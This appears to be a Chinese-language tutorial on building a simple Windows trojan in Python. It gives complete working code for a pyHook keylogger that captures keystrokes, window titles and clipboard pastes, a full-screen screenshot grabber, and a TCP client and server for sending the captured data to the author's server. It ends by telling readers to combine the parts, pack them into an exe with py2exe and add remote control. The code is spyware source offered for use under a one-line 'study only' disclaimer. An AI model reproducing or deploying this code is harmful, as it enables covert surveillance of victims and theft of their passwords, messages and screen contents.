# Python编写简易木马程序

0x00 准备
=======

* * *

文章内容仅供学习研究、切勿用于非法用途！

这次我们使用Python编写一个具有键盘记录、截屏以及通信功能的简易木马。依然选用Sublime text2 +JEDI（python自动补全插件）来撸代码，安装配置JEDI插件可以参照这里： http://drops.wooyun.org/tips/4413

首先准备好我们需要的依赖库,python hook和pythoncom。

下载安装python hook

![enter image description here](http://drops.javaweb.org/uploads/images/1ae5d96885f893047eabf14e0839dceda421648a.jpg)

下载安装pythoncom模块：

http://sourceforge.net/projects/pywin32/files/pywin32/Build%20219/pywin32-219.win32-py2.7.exe/download

![enter image description here](http://drops.javaweb.org/uploads/images/6d05b61d811ed619153b1e1e2b6b25051f6eb0e9.jpg)

如果觉得麻烦，你可以直接使用集成了所有我们所需要的python库的商业版Activepython（我们可以用他的免费版）：

http://www.activestate.com/activepython

0x01 键盘记录器
==========

* * *

说起Keylogger，大家的思维可能早已飞向带有wifi功能的mini小硬件去了。抛开高科技，我们暂且回归本质，探探简易键盘记录器的原理与实现。

Python keylogger键盘记录的功能的实现主要利用了pythoncom及pythonhook，然后就是对windows API的各种调用。Python之所以用起来方便快捷，主要归功于这些庞大的支持库，正所谓“人生苦短，快用Python”。

代码部分：

```
# -*- coding: utf-8 -*-  
from ctypes import *
import pythoncom
import pyHook
import win32clipboard

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None

# 
def get_current_process():

    # 获取最上层的窗口句柄
    hwnd = user32.GetForegroundWindow()

    # 获取进程ID
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd,byref(pid))

    # 将进程ID存入变量中
    process_id = "%d" % pid.value

    # 申请内存
    executable = create_string_buffer("\x00"*512)
    h_process = kernel32.OpenProcess(0x400 | 0x10,False,pid)

    psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)

    # 读取窗口标题
    windows_title = create_string_buffer("\x00"*512)
    length = user32.GetWindowTextA(hwnd,byref(windows_title),512)

    # 打印
    print 
    print "[ PID:%s-%s-%s]" % (process_id,executable.value,windows_title.value)
    print 

    # 关闭handles
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)

# 定义击键监听事件函数
def KeyStroke(event):

    global current_window

    # 检测目标窗口是否转移(换了其他窗口就监听新的窗口)
    if event.WindowName != current_window:
        current_window = event.WindowName
        # 函数调用
        get_current_process()

    # 检测击键是否常规按键（非组合键等）
    if event.Ascii > 32 and event.Ascii <127:
        print chr(event.Ascii),
    else:
        # 如果发现Ctrl+v（粘贴）事件，就把粘贴板内容记录下来
        if event.Key == "V":
            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            print "[PASTE]-%s" % (pasted_value),
        else:
            print "[%s]" % event.Key,
    # 循环监听下一个击键事件
    return True

# 创建并注册hook管理器
kl = pyHook.HookManager()
kl.KeyDown = KeyStroke

# 注册hook并执行
kl.HookKeyboard()
pythoncom.PumpMessages()

```

【知识点】钩子(Hook)：Windows消息处理机制的一个平台,应用程序可以在上面设置子程以监视指定窗口的某种消息，而且所监视的窗口可以是其他进程所创建的。

撸代码时一定要注意严格区分大小写。检查无误后启动keylogger：

![enter image description here](http://drops.javaweb.org/uploads/images/038fcfc485c7270e69c61a31fdc3dd99f304e0f6.jpg)

然后可以尝试打开记事本写点东西，过程中可以看到我们的keylogger窗口正在对我们的输入实时记录：

![enter image description here](http://drops.javaweb.org/uploads/images/949833cafb8299baa7c01f6f19d6b5346adb9bcf.jpg)

切换窗口时会自动跟踪到新窗口（众：这点功能都没有还敢叫keylogger吗！），light教授趁机骚扰一下疯狗，可以看到我们的keylogger已经跟踪到QQ聊天窗口，并忠实的记录下我输入的一切。

![enter image description here](http://drops.javaweb.org/uploads/images/98d0e7a6f6263f39c54119198f1d0e4149c5cbe3.jpg)

0x02 看看你在干什么：编写一个screenshotter
==============================

* * *

截屏实现起来更简单，直接调用几个gui相关的api即可，我们直接看代码：

```
# -*- coding: utf-8 -*-  
import win32gui
import win32ui
import win32con
import win32api

# 获取桌面
hdesktop = win32gui.GetDesktopWindow()

# 分辨率适应
width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)

# 创建设备描述表
desktop_dc = win32gui.GetWindowDC(hdesktop)
img_dc = win32ui.CreateDCFromHandle(desktop_dc)

# 创建一个内存设备描述表
mem_dc = img_dc.CreateCompatibleDC()

# 创建位图对象
screenshot = win32ui.CreateBitmap()
screenshot.CreateCompatibleBitmap(img_dc, width, height)
mem_dc.SelectObject(screenshot)

# 截图至内存设备描述表
mem_dc.BitBlt((0, 0), (width, height), img_dc, (left, top), win32con.SRCCOPY)

# 将截图保存到文件中
screenshot.SaveBitmapFile(mem_dc, 'c:\\WINDOWS\\Temp\\screenshot.bmp')

# 内存释放
mem_dc.DeleteDC()
win32gui.DeleteObject(screenshot.GetHandle())

```

看看效果如何：

![enter image description here](http://drops.javaweb.org/uploads/images/5db0201479e967f8457776bc5cce8a0b31d30455.jpg)

0x03 综合运用：完成一个简易木马
==================

* * *

无论是keylogger记录下的内容，还是screenshotter截获的图片，只存在客户端是没有太大意义的，我们需要构建一个简单server和client端来进行通信，传输记录下的内容到我们的服务器上。

编写一个简单的TCPclient

```
# -*- coding: utf-8 -*- 
import socket

# 目标地址IP/URL及端口
target_host = "127.0.0.1"
target_port = 9999

# 创建一个socket对象
client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

# 连接主机
client.connect((target_host,target_port))

# 发送数据
client.send("GET / HTTP/1.1\r\nHOST:127.0.0.1\r\n\r\n")

# 接收响应
response = client.recv(4096)

print response

```

编写一个简单的TCPserver

```
# -*- coding: utf-8 -*- 
import socket
import threading

# 监听的IP及端口
bind_ip = "127.0.0.1"
bind_port = 9999

server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

server.bind((bind_ip,bind_port))

server.listen(5)

print "[*] Listening on %s:%d" % (bind_ip,bind_port)

def handle_client(client_socket):

    request = client_socket.recv(1024)

    print "[*] Received:%s" % request

    client_socket.send("ok!")

    client_socket.close()

while True:

    client,addr = server.accept()

    print "[*] Accept connection from:%s:%d" % (addr[0],addr[1])

    client_handler = threading.Thread(target=handle_client,args=(client,))

    client_handler.start()

```

开启服务端监听：

![enter image description here](http://drops.javaweb.org/uploads/images/37d107e626d499e3fbdf2680f2ced666311c2669.jpg)

客户端执行：

![enter image description here](http://drops.javaweb.org/uploads/images/b1c7bafb4a47aa4cfd6805c0a5c0933f1bbdf85a.jpg)

服务端接收到客户端的请求并作出响应：

0x04 结语
=======

* * *

最后，你需要做的就是把上面三个模块结合起来，一个简易的具有键盘记录、屏幕截图并可以发送内容到我们服务端的木马就完成了。可以使用py2exe把脚本生成exe可执行文件。当然你还可以继续发挥，加上远程控制功能。Py2exe用法可以参考这里：

http://www.py2exe.org/index.cgi/Tutorial

Enjoy coding~

参考文档：
-----

《Black Hat Python》 https://www.google.com https://www.python.org/ http://www.py2exe.org/